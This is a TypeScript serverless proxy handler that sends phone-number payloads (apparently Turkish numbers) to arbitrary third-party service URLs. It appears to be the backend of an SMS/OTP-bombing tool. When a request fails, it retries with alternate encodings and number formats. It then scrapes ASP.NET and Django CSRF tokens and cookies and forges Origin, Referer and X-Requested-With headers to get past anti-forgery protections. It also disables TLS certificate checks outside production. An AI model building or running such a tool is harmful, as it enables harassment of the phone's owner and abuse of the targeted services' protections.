import type { VercelRequest, VercelResponse } from '@vercel/node';
import axios, { AxiosError } from 'axios';

if (process.env.NODE_ENV !== 'production') {
    process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
}

const STD_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Content-Type': 'application/json',
  'Accept': 'application/json, text/plain, */*'
};

function interpolatePhone(schema: any, targetPhone: string, email?: string): any {
    let str = JSON.stringify(schema);
    str = str.replace(/{{PHONE}}/g, targetPhone);
    str = str.replace(/{{EMAIL}}/g, email || 'test@test.com');
    str = str.replace(/\+905XXXXXXXXX/g, `+90${targetPhone}`);
    str = str.replace(/905XXXXXXXXX/g, `90${targetPhone}`);
    str = str.replace(/05XXXXXXXXX/g, `0${targetPhone}`);
    str = str.replace(/5XXXXXXXXX/g, targetPhone);
    return JSON.parse(str);
}

async function executeRequest(
  url: string, method: string, payload: any, headers: any, timeout = 15000
): Promise<{ success: boolean; status: number; data: any; html: string }> {
    try {
        const response = await axios({
            method: method || 'POST',
            url,
            data: payload,
            timeout,
            headers: headers || STD_HEADERS,
            validateStatus: () => true
        });
        return { success: response.status >= 200 && response.status < 300, status: response.status, data: response.data, html: '' };
    } catch (err: unknown) {
        const axiosErr = err as AxiosError;
        return { 
            success: false, 
            status: axiosErr.response?.status || 0, 
            data: axiosErr.response?.data || (err as Error).message,
            html: typeof axiosErr.response?.data === 'string' ? axiosErr.response.data as string : JSON.stringify(axiosErr.response?.data) 
        };
    }
}

async function attemptStrategies({
  serviceId, serviceUrl, serviceMethod, targetPhone, email, payloadToUse, customHeaders
}: {
  serviceId: string; serviceUrl: string; serviceMethod: string;
  targetPhone: string; email: string; payloadToUse: any; customHeaders?: Record<string, string>;
}): Promise<any[]> {
  const results: any[] = [];
  const mergedHeaders = { ...STD_HEADERS, ...(customHeaders || {}) };

  // 1 — Direct
  const r1 = await executeRequest(serviceUrl, serviceMethod, payloadToUse, mergedHeaders);
  results.push({ attempt: 1, strategy: 'direct', ...r1 });
  if (r1.success) return results;

  // 2 — form-urlencoded + extra headers
  {
    const origin = new URL(serviceUrl).origin;
    const formHeaders = {
      ...STD_HEADERS,
      ...(customHeaders || {}),
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': origin,
      'Referer': origin + '/',
      'X-Requested-With': 'XMLHttpRequest'
    };
    let encoded: string;
    try {
      const parsed = typeof payloadToUse === 'object' ? payloadToUse : JSON.parse(payloadToUse);
      encoded = new URLSearchParams(parsed).toString();
    } catch {
      encoded = typeof payloadToUse === 'string' ? payloadToUse : JSON.stringify(payloadToUse);
    }
    const r3 = await executeRequest(serviceUrl, serviceMethod, encoded, formHeaders);
    results.push({ attempt: 3, strategy: 'form_urlencoded', ...r3 });
    if (r3.success) return results;
  }

  // 3 — bare phone
  {
    const r4 = await executeRequest(serviceUrl, serviceMethod, { phone: targetPhone }, { ...STD_HEADERS, ...(customHeaders || {}) });
    results.push({ attempt: 3, strategy: 'bare_phone', ...r4 });
    if (r4.success) return results;
  }

  // 4 — 90 format
  {
    const r5 = await executeRequest(serviceUrl, serviceMethod, { phone: `90${targetPhone}` }, { ...STD_HEADERS, ...(customHeaders || {}) });
    results.push({ attempt: 4, strategy: '90_format', ...r5 });
    if (r5.success) return results;
  }

  // 5 — CSRF: fetch page → extract token → re-submit
  {
    const csrfOrigin = new URL(serviceUrl).origin;
    const csrfHeaders = {
      ...STD_HEADERS,
      ...(customHeaders || {}),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    };

    try {
      // GET the root page first to collect cookies (Django csrftoken) and ASP.NET tokens
      const preflight = await axios({
        method: 'GET',
        url: csrfOrigin + '/',
        timeout: 10000,
        headers: { 'User-Agent': STD_HEADERS['User-Agent'], 'Accept': csrfHeaders['Accept'] },
        validateStatus: () => true,
        maxRedirects: 5
      });

      if (preflight.status >= 200 && preflight.status < 400) {
        let csrfToken = '';
        const bodyStr = typeof preflight.data === 'string' ? preflight.data : '';
        const allSetCookies: string[] = preflight.headers['set-cookie'] || [];

        // ASP.NET __RequestVerificationToken
        const aspMatch = bodyStr.match(/<input[^>]*name=["']__RequestVerificationToken["'][^>]*value=["']([^"']+)["'][^>]*\/?>/i);
        if (aspMatch) csrfToken = aspMatch[1];

        // Django csrfmiddlewaretoken
        const djangoBodyMatch = bodyStr.match(/<input[^>]*name=["']csrfmiddlewaretoken["'][^>]*value=["']([^"']+)["']/i);
        if (!csrfToken && djangoBodyMatch) csrfToken = djangoBodyMatch[1];

        // Django csrftoken cookie
        let djangoCookie = '';
        for (const c of allSetCookies) {
          const m = c.match(/csrftoken=([^;]+)/);
          if (m) { djangoCookie = m[1]; break; }
        }

        if (csrfToken || djangoCookie) {
          const csrfMerged = { ...csrfHeaders, ...(customHeaders || {}) };
          csrfMerged['Content-Type'] = 'application/x-www-form-urlencoded';
          if (djangoCookie) {
            csrfMerged['X-CSRFToken'] = djangoCookie;
            csrfMerged['Cookie'] = 'csrftoken=' + djangoCookie;
          }

          let csrfEncoded: string;
          if (csrfToken) {
            const parsedPayload = typeof payloadToUse === 'object' ? { ...payloadToUse } : JSON.parse(JSON.stringify(payloadToUse));
            parsedPayload.__RequestVerificationToken = csrfToken;
            try {
              const kv = typeof parsedPayload === 'object' ? parsedPayload : JSON.parse(parsedPayload);
              csrfEncoded = new URLSearchParams(kv).toString();
            } catch { csrfEncoded = JSON.stringify(parsedPayload); }
          } else {
            try {
              const parsed = typeof payloadToUse === 'object' ? payloadToUse : JSON.parse(payloadToUse);
              csrfEncoded = new URLSearchParams(parsed).toString();
            } catch { csrfEncoded = typeof payloadToUse === 'string' ? payloadToUse : JSON.stringify(payloadToUse); }
          }

          // Try form-urlencoded first
          const r6 = await executeRequest(serviceUrl, serviceMethod, csrfEncoded, {
            ...csrfMerged,
            'Origin': csrfOrigin,
            'Referer': csrfOrigin + '/'
          });
          results.push({ attempt: 5, strategy: 'csrf', ...r6 });
          if (r6.success) return results;

          // Try JSON
          const r6b = await executeRequest(serviceUrl, serviceMethod, payloadToUse, {
            ...csrfMerged,
            'Content-Type': 'application/json',
            'Origin': csrfOrigin,
            'Referer': csrfOrigin + '/'
          });
          results.push({ attempt: 6, strategy: 'csrf_json', ...r6b });
          if (r6b.success) return results;
        }
      }
    } catch {
      // CSRF preflight failed, skip
    }
  }

  return results;
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { serviceId, serviceUrl, serviceMethod, serviceHeaders, targetPhone, email, initialPayload } = req.body;

    if (!serviceId || !serviceUrl || !targetPhone) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    try {
        let payloadToUse = initialPayload
          ? (typeof initialPayload === 'string' ? JSON.parse(initialPayload) : initialPayload)
          : { phone: targetPhone };
        payloadToUse = interpolatePhone(payloadToUse, targetPhone, email);

        const attempts = await attemptStrategies({
          serviceId, serviceUrl, serviceMethod: serviceMethod || 'POST', targetPhone, email: email || '', payloadToUse, customHeaders: serviceHeaders
        });

        const successAttempt = attempts.find(a => a.success);
        if (successAttempt) {
            return res.status(200).json({
                ok: true,
                upstreamStatus: successAttempt.status,
                attempt: successAttempt.attempt,
                strategy: successAttempt.strategy,
                healed: successAttempt.healed || false,
                healedPayload: successAttempt.healedPayload || null
            });
        }

        const lastAttempt = attempts[attempts.length - 1] || { strategy: 'none', status: 0, data: 'No attempts made' };
        return res.status(502).json({
            ok: false,
            upstreamStatus: lastAttempt.status || 0,
            strategy: lastAttempt.strategy || 'none',
            error: 'All upstream attempts failed',
            lastResponse: typeof lastAttempt.data === 'string' ? lastAttempt.data.substring(0, 200) : JSON.stringify(lastAttempt.data).substring(0, 200)
        });

    } catch (error: unknown) {
        console.error('[Proxy] Error:', error);
        return res.status(502).json({ ok: false, upstreamStatus: 0, strategy: 'error', error: (error as Error).message });
    }
}
